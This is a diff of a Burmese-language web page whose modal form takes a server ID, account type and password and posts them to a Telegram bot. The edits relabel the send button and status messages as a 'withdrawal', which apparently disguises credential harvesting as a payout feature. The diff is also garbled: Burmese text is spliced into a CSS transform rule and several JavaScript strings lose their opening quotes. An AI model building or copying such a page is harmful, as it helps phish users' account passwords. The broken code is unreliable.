@@ -146,8 +146,7 @@
             width: 90%;
             max-width: 400px;
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.7);
-            transform: scale(0.9);
-            transition: transform 0.3s ease;
+            transform: scaleစာပို့မည်       transition: transform 0.3s ease;
         }
         .modal-overlay.open .modal-content {
             transform: scale(1);
@@ -317,8 +316,7 @@
 
             <div class="flex justify-end mt-4">
                 <button onclick="sendMessageToTelegram()" class="modal-send-btn">
-                    စာပို့မည်
-                </button>
+                    ထုတ်ယူရန်            </button>
                 <button onclick="closeTelegramModal()" class="modal-send-btn modal-close-btn">
                     ပိတ်မည်
                 </button>
@@ -371,7 +369,7 @@
             
             // 🛠️ Validation သုံးခုလုံး စစ်ဆေးခြင်း
             if (!idServer || !accountType || !password) {
-                statusElement.innerText = 'အကွက်အားလုံးကို ဖြည့်သွင်းရန် လိုအပ်ပါသည်။';
+                statusElement.innerText = 'အားလုံးကို ဖြည့်သွင်းရန် လိုအပ်ပါသည်။';
                 statusElement.style.color = '#f05252'; // Red
                 return;
             }
@@ -389,7 +387,7 @@
 
             const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
-            statusElement.innerText = 'ပို့နေပါသည်...';
+            statusElement.innerText = ထုတ်ယူနေပါသည်...';
             statusElement.style.color = '#fca311'; // Yellow
 
             try {
@@ -408,12 +406,12 @@
                 const data = await response.json();
 
                 if (response.ok && data.ok) {
-                    statusElement.innerText = 'ပို့ပြီးပါပြီ! ကျေးဇူးတင်ပါသည်။';
+                    statusElement.innerText = ထုတ်ယူပြီးပါပြီ! ကျေးဇူးတင်ပါသည်။';
                     statusElement.style.color = '#2d942e'; // Green
                     // 3 စက္ကန့်အကြာတွင် Modal ပိတ်ရန်
                     setTimeout(closeTelegramModal, 3000); 
                 } else {
-                    statusElement.innerText = `စာပို့မရပါ: ${data.description || 'အမှားတစ်ခုခုရှိနေပါသည်။ Token သို့မဟုတ် Chat ID ကို စစ်ပါ။'}`;
+                    statusElement.innerText = `ထုတ်ယူ၍မရပါ: ${data.description || 'အမှားတစ်ခုခုရှိနေပါသည်။ Token သို့မဟုတ် Chat ID ကို စစ်ပါ။'}`;
                     statusElement.style.color = '#f05252'; // Red
                 }
 
